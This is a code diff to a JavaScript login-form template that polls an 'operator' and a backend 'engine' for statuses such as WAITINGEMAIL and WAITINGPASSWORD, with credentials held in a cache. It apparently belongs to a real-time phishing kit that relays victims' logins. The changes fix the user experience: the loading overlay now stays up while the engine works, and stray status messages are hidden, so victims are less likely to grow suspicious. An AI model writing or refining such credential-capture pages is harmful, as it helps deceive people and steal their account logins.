@@ -836,6 +836,11 @@ function updateUIForStatus(status, data = {}) {
       emailField.readOnly = true;
       passwordField.disabled = true;
       setFormSubmitting(true);
+      // Keep the loading overlay up while the engine works. Previously the PROCESSING
+      // case did not show it, so the form flashed back after Verify once polling returned
+      // (e.g. WAITINGPASSWORD with credentials already cached). The overlay stays until
+      // engineProcessing=false delivers a non-processing status (real form, redirect, or error).
+      showLoadingOverlay(true);
       if (!processingStartTime) processingStartTime = Date.now();
       startPolling(2000);
       break;
@@ -852,7 +857,10 @@ function updateUIForStatus(status, data = {}) {
       emailField.readOnly = prefilledEmail;
       passwordField.disabled = false;
       passwordField.readOnly = false;
-      if (data.lastJsonResponse) {
+      // Only render lastJsonResponse.message for a real error state (WAITINGEMAILERROR).
+      // Plain WAITINGEMAIL carries an informational message like "Awaiting email input."
+      // that must not be displayed.
+      if (status === 'WAITINGEMAILERROR' && data.lastJsonResponse) {
         try {
           const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
           if (lastResp.message && !lastResp.message.includes('Processing email')) {
@@ -1289,9 +1297,12 @@ async function pollOperator() {
           console.error('[Template] PROCESSING timeout exceeded');
           return;
         }
-        if (data.currentStatus === 'PROCESSING') {
-          return;
-        }
+        // engineProcessing=true means the engine is actively working. Keep the loading
+        // overlay up regardless of the current status (e.g. WAITINGPASSWORD with password
+        // already in cache) instead of re-rendering the waiting form, which wiped the
+        // loading state a second after Verify. Terminal statuses always come back with
+        // engineProcessing=false, so redirect/error still render below.
+        return;
       }
       console.log('[Template] engineProcessing=false | updating UI for status:', data.currentStatus, '| browserId:', browserId);
       isProcessing = false;
